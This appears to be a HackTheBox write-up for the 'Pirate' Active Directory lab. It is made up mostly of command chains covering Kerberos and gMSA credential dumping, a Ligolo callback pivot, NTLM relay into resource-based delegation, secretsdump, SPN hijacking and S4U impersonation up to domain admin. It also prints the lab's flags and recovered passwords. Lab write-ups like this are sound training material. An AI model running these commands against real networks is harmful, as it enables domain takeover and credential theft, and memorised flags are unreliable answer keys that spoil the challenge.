<!-- =========================================================
 🏴‍☠️ Pirate — HackTheBox Writeup (Active Directory)
 Author: Mrs. Nobody
 Target: <Target_Machine_IP>
========================================================= -->

<p align="center">
  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=26&duration=2500&pause=800&color=00FF9C&center=true&vCenter=true&width=900&lines=Pirate+%E2%80%94+HackTheBox+Writeup;Active+Directory+%7C+Kerberos+%7C+Delegation+Abuse;Full+Domain+Compromise" />
</p>

<p align="center">
  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:0a0f1a,100:00ff9c&height=120&section=header&text=Pirate%20HTB&fontSize=44&fontColor=00ff9c&animation=twinkling&fontAlignY=35" />
</p>

<p align="center">
  <img src="assets/MrsNobody.png" width="260" alt="Mrs. Nobody" />
</p>

<p align="center">
  <strong>Author:</strong> Mrs. Nobody  
</p>

<p align="center">
  <img src="https://img.shields.io/badge/HackTheBox-PWNED-00ff9c?style=for-the-badge&logo=hackthebox&logoColor=black" />
  <img src="https://img.shields.io/badge/Category-Active%20Directory-0a0f1a?style=for-the-badge&logo=windows&logoColor=00ff9c" />
  <img src="https://img.shields.io/badge/Focus-Kerberos%20%2F%20Delegation-0a0f1a?style=for-the-badge&logo=keybase&logoColor=00ff9c" />
  <img src="https://img.shields.io/badge/Tools-Impacket%20%7C%20Evil--WinRM%20%7C%20Ligolo-0a0f1a?style=for-the-badge&logo=gnubash&logoColor=00ff9c" />
</p>

---

# 🎯 Target

- **Domain:** PIRATE.HTB  
- **Target IP:** `<Target_Machine_IP>`

---

# 🚩 Flags

## 👤 User Flag

**Location**
```
C:\Users\a.white\Desktop\user.txt
```

**Command**
```cmd
type C:\Users\a.white\Desktop\user.txt
```

**Flag**
```
8af6758f07189ef50343d98ab6748d33
```

---

## 👑 Root Flag

**Location**
```
C:\Users\Administrator\Desktop\root.txt
```

**Command**
```cmd
type C:\Users\Administrator\Desktop\root.txt
```

**Flag**
```
b0c531c3049564d7e3a263a704e46b98
```

---

# 🧭 Attack Chain Overview

```
MS01$ (Pre-Win2000)
  → gMSA dump
    → DC shell
      → Ligolo pivot
        → NTLM relay → RBCD
          → Administrator on WEB01
            → secretsdump
              → Reset a.white_adm
                → SPN injection
                  → S4U abuse
                    → Administrator on DC01
                      → root.txt
```

---

# 1️⃣ Initial Setup

## 🖥 ATTACK TERMINAL (Kali)

### Add Hosts

```bash
sudo nano /etc/hosts
```

```
<Target_Machine_IP>  DC01.pirate.htb pirate.htb MS01.pirate.htb
192.168.100.2        WEB01.pirate.htb
```

---

### Configure Kerberos

```bash
sudo nano /etc/krb5.conf
```

```ini
[libdefaults]
    default_realm = PIRATE.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    PIRATE.HTB = {
        kdc = <Target_Machine_IP>
        admin_server = <Target_Machine_IP>
    }

[domain_realm]
    .pirate.htb = PIRATE.HTB
    pirate.htb = PIRATE.HTB
```

---

# 2️⃣ Pre-Windows 2000 Compatible Access Abuse

MS01$ was a member of:

> Pre-Windows 2000 Compatible Access

Machine password = machine name (`ms01`)

```bash
impacket-getTGT 'PIRATE.HTB/MS01$:ms01'
export KRB5CCNAME=MS01\$.ccache
klist
```

---

# 3️⃣ Dump gMSA Passwords

```bash
python3 gMSADumper.py -d pirate.htb -l dc01.pirate.htb -k
```

Recovered:

```
gMSA_ADFS_prod$:::8126756fb2e69697bfcb04816e685839
```

---

# 4️⃣ Shell on DC01

```bash
evil-winrm -i DC01.pirate.htb \
  -u 'gMSA_ADFS_prod$' \
  -H '8126756fb2e69697bfcb04816e685839'
```

---

# 5️⃣ Pivot to Internal Network (Ligolo)

### 🖥 ATTACK TERMINAL — Start Proxy

```bash
./proxy -selfcert -laddr 0.0.0.0:443
```

### 🪟 DC SHELL — Run Agent

```powershell
.\agent.exe -connect <YOUR_TUN_IP>:443 -ignore-cert
```

### 🖥 ATTACK TERMINAL — Configure Tunnel

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 192.168.100.0/24 dev ligolo
sudo ip addr add 192.168.100.50/24 dev ligolo
```

---

# 6️⃣ NTLM Relay → RBCD

```bash
ntlmrelayx.py -t ldaps://<Target_Machine_IP> --delegate-access --remove-mic -smb2support
```

```bash
coercer coerce -l <YOUR_TUN_IP> -t 192.168.100.2 -d pirate.htb \
  -u 'gMSA_ADFS_prod$' --hashes :8126756fb2e69697bfcb04816e685839 --always-continue
```

---

# 7️⃣ Administrator on WEB01

```bash
python3 /usr/share/doc/python3-impacket/examples/getST.py \
  -spn 'cifs/WEB01.pirate.htb' \
  -impersonate 'Administrator' \
  'pirate.htb/VYSHKGDW$:PASSWORD' \
  -dc-ip <Target_Machine_IP>
```

```bash
export KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
```

```bash
python3 /usr/share/doc/python3-impacket/examples/psexec.py \
  -k -no-pass Administrator@WEB01.pirate.htb
```

---

# 8️⃣ Dump Credentials

```bash
secretsdump.py -k -no-pass WEB01.pirate.htb -outputfile web01_dump
```

Recovered:

```
PIRATE\a.white : E2nvAOKSz5Xz2MJu
```

---

# 9️⃣ Reset Delegated Admin Password

```bash
bloodyAD -d pirate.htb -u 'a.white' -p 'E2nvAOKSz5Xz2MJu' \
  -H <Target_Machine_IP> -i <Target_Machine_IP> \
  set password a.white_adm 'pulse1337!'
```

---

# 🔟 SPN Injection (WriteSPN Abuse)

⚠ MUST move BOTH:

- HTTP/WEB01.pirate.htb  
- HTTP/WEB01  

```bash
python3 addspn.py <Target_Machine_IP> -u 'PIRATE\a.white_adm' -p 'pulse1337!' \
  -t 'WEB01$' -s 'HTTP/WEB01.pirate.htb' --remove

python3 addspn.py <Target_Machine_IP> -u 'PIRATE\a.white_adm' -p 'pulse1337!' \
  -t 'WEB01$' -s 'HTTP/WEB01' --remove

python3 addspn.py <Target_Machine_IP> -u 'PIRATE\a.white_adm' -p 'pulse1337!' \
  -t 'DC01$' -s 'HTTP/WEB01.pirate.htb'

python3 addspn.py <Target_Machine_IP> -u 'PIRATE\a.white_adm' -p 'pulse1337!' \
  -t 'DC01$' -s 'HTTP/WEB01'
```

---

# 1️⃣1️⃣ S4U Delegation → DC01 Administrator

```bash
python3 /usr/share/doc/python3-impacket/examples/getST.py \
  -spn 'HTTP/WEB01.pirate.htb' \
  -impersonate 'Administrator' \
  'pirate.htb/a.white_adm:pulse1337!' \
  -dc-ip <Target_Machine_IP> \
  -altservice 'CIFS/DC01.pirate.htb'
```

```bash
export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
klist
```

```bash
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
  -k -no-pass pirate.htb/Administrator@DC01.pirate.htb
```

---

# 🏁 Completed

✔ User flag captured  
✔ Root flag captured  
✔ Full Domain Compromise achieved  

---

<p align="center">
  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:00ff9c,100:0a0f1a&height=120&section=footer&animation=twinkling" />
</p>
